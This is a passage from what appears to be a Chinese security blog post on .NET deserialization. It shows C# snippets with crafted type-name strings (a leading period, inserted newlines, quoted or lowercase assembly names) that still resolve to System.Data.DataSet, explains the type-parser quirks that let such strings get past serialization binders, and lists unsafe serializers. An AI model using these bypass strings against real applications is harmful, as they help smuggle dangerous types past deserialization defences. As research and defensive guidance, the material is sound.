            <span class="c1">//  typeof(typeName)</span>
            <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">type</span><span class="p">.</span><span class="n">FullName</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">type</span><span class="p">.</span><span class="n">AssemblyQualifiedName</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">ReadLine</span><span class="p">();</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231108201428-5d967836-7e30-1.png"/></p>
<h3 data-content="1" id="6febcf656b36a18f13fc721893616ac7">字符绕过方式2</h3>
<p>面加一个<code>.</code>也可以解析</p>
<div class="highlight"><pre><span></span><span class="kt">string</span> <span class="n">typeName</span> <span class="p">=</span> <span class="s">".\n\n\n\n\n\n\nSystem.Data.DataSet,\n\n\n\n\n\n\n System.Data, Version=4.0.0.0,\n\n\n\n\n\n\n Culture=neutral, PublicKeyToken=b77a5c561934e089\n\n\n\n\n\n\n"</span><span class="p">;</span>
            <span class="c1">//  typeof(typeName)</span>
            <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">type</span><span class="p">.</span><span class="n">FullName</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">type</span><span class="p">.</span><span class="n">AssemblyQualifiedName</span><span class="p">);</span>
            <span class="n">Console</span><span class="p">.</span><span class="n">ReadLine</span><span class="p">();</span>
</pre></div>
<p>前</p>
<h3 data-content="1" id="a6b33d6e93cfd4da8fdd8fca4cfe665f">字符绕过方式3</h3>
<div class="highlight"><pre><span></span><span class="kt">string</span> <span class="n">typeName</span> <span class="p">=</span> <span class="s">".System.Data.DataSet,\"System.Data\", Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"</span><span class="p">;</span>
</pre></div>
<p>程序集<code>，</code>中间可以<code>"</code>隔开</p>
<h3 data-content="1" id="f665d11a8407ab60c78cf7c9b2ce1f9b">绕过方式4</h3>
<div class="highlight"><pre><span></span><span class="kt">string</span> <span class="n">typeName</span> <span class="p">=</span> <span class="s">"System.Data.DataSet, \"system.data\", version=4.0.0.0, culture=neutral, publicKeyToken=b77a5c561934e089"</span><span class="p">;</span>
</pre></div>
<p>程序集可以使用小写</p>
<p>前者的优点是类型解析成本较高，因此有些人<a href="https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization" target="_blank">建议不要使用它，以防止可能的拒绝服务攻击</a>。</p>
<p>然而，另一方面，类型名称解析并不是那么简单，.NET 的内部类型解析器/绑定器允许一些意外的怪癖：</p>
<ul>
<li>标记之间的空白字符（即 U+0009、U+000A、U+000D、U+0020）通常会被忽略，在某些情况下甚至会忽略更多字符</li>
<li>类型名称可以“ .”（句点）开头，例如，.System.Data.DataSet</li>
<li>程序集名称不区分大小写并且可以用引号引起来，例如MsCoRlIb和"mscorlib"</li>
<li>程序集属性值可以被引用，即使是不正确的，例如，PublicKeyToken="b77a5c561934e089"和PublicKeyToken='b77a5c561934e089</li>
<li>.NET Framework 程序集通常只需要PublicKey/PublicKeyToken属性，例如，System.Data.DataSet, System.Data, PublicKey=00000000000000000400000000000000或System.Data.DataSet, System.Data, PublicKeyToken=b77a5c561934e089</li>
<li>程序集属性可以是任意顺序，例如，System.Data, PublicKeyToken=b77a5c561934e089, Culture=neutral, Version=4.0.0.0</li>
<li>允许任意附加的程序集属性，例如，System.Data, Foo=bar, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, Baz=quux</li>
<li>程序集属性可以包含几乎任意数据（支持的转义序列：\"、\'、\,、\/、\=、\、\n、\r和\t）</li>
</ul>
<h2 data-content="1" id="b76003e915ad6c0b94770fd8f469cd29">危险的替代方法</h2>
<p>避免使用以下序列化程序：</p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter" target="_blank">SoapFormatter</a></li>
<li><a href="https://learn.microsoft.com/zh-cn/dotnet/api/system.web.ui.losformatter" target="_blank">LosFormatter</a></li>
<li><a href="https://learn.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.netdatacontractserializer" target="_blank">NetDataContractSerializer</a></li>
<li><a href="https://learn.microsoft.com/zh-cn/dotnet/api/system.web.ui.objectstateformatter" target="_blank">ObjectStateFormatter</a></li>
</ul>
<p>上述序列化程序都执行不受限制的多态反序列化，并且会带来风险，就像 BinaryFormatter 一样。</p>
<h3 data-content="1" id="8d90f67bf5b0177b94f94cb6a84c0688">参考文章</h3>
<p><a href="https://paper.seebug.org/1927/" target="_blank">https://paper.seebug.org/1927/</a></p>
<p><a href="https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html" target="_blank">https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html</a></p>
<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/dotnet-serialize-101.md" target="_blank">https://github.com/Y4er/dotnet-deserialization/blob/main/dotnet-serialize-101.md</a></p>
<p><a href="https://testbnull.medium.com/note-nhanh-về-binaryformatter-binder-và-cve-2022-23277-6510d469604c" target="_blank">https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c</a></p>
<p><a href="https://code-white.com/blog/https://research.nccgroup.com/2019/03/19/finding-and-exploiting-net-remoting-over-http-using-deserialisation/" target="_blank">https://code-white.com/blog/https://research.nccgroup.com/2019/03/19/finding-and-exploiting-net-remoting-over-http-using-deserialisation/</a></p>
<p><a href="https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization" target="_blank">https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization</a></p>
</div>
</div>